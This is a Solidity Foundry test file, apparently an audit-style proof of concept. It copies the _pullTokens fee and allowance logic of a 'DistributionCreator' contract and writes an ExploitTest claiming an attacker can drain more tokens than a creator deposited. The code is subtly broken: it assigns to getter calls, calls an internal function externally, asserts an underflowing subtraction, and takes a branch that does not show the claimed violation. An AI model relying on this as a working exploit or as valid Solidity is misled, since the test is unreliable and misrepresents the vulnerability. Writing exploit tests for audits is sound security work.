// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name = "MockToken";
    string public symbol = "MCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        balanceOf[from] -= amount;
        allowance[from][msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
}

contract DistributionCreator {
    address public feeRecipient;
    address public distributor;
    mapping(address => mapping(address => uint256)) public creatorBalance;
    mapping(address => mapping(address => mapping(address => uint256))) public creatorAllowance;

    function _pullTokens(address creator, address rewardToken, uint256 campaignAmount, uint256 campaignAmountMinusFees) internal {
        uint256 fees = campaignAmount - campaignAmountMinusFees;
        address _feeRecipient;
        if (fees > 0) {
            _feeRecipient = feeRecipient;
            _feeRecipient = _feeRecipient == address(0) ? address(this) : _feeRecipient;
        }
        uint256 userBalance = creatorBalance[creator][rewardToken];
        if (userBalance >= campaignAmount) {
            if (msg.sender != creator) {
                uint256 senderAllowance = creatorAllowance[creator][msg.sender][rewardToken];
                if (senderAllowance >= campaignAmount) {
                    creatorAllowance[creator][msg.sender][rewardToken] -= campaignAmount;
                } else {
                    if (fees > 0) IERC20(rewardToken).transferFrom(msg.sender, _feeRecipient, fees);
                    IERC20(rewardToken).transferFrom(msg.sender, distributor, campaignAmountMinusFees);
                    return;
                }
            }
            creatorBalance[creator][rewardToken] -= campaignAmount;
            if (fees > 0 && _feeRecipient != address(this)) IERC20(rewardToken).transfer(_feeRecipient, fees);
            IERC20(rewardToken).transfer(distributor, campaignAmountMinusFees);
        } else {
            if (fees > 0) IERC20(rewardToken).transferFrom(msg.sender, _feeRecipient, fees);
            IERC20(rewardToken).transferFrom(msg.sender, distributor, campaignAmountMinusFees);
        }
    }
}

contract ExploitTest is Test {
    MockERC20 token;
    DistributionCreator distributionCreator;
    address creator = address(0x1);
    address attacker = address(0x2);
    address distributor = address(0x3);

    function setUp() public {
        token = new MockERC20();
        distributionCreator = new DistributionCreator();
        distributionCreator.feeRecipient() = address(0x4);
        distributionCreator.distributor() = distributor;

        // Mint tokens to creator and attacker
        token.mint(creator, 1000 ether);
        token.mint(attacker, 1000 ether);

        // Set initial balances and allowances
        distributionCreator.creatorBalance(creator, address(token)) = 500 ether;
        distributionCreator.creatorAllowance(creator, attacker, address(token)) = 500 ether;

        // Approve the distributionCreator to spend attacker's tokens
        vm.prank(attacker);
        token.approve(address(distributionCreator), 1000 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker calls _pullTokens with manipulated parameters
        vm.prank(attacker);
        distributionCreator._pullTokens(creator, address(token), 600 ether, 550 ether);

        // Step 2: Check the balances to assert the invariant violation
        uint256 creatorBalance = distributionCreator.creatorBalance(creator, address(token));
        uint256 distributorBalance = token.balanceOf(distributor);

        // Assert the vulnerability: distributed more tokens than deposited
        assertEq(creatorBalance, 500 ether - 600 ether); // Should be negative, indicating an error
        assertEq(distributorBalance, 550 ether); // Distributor received more than available
    }
}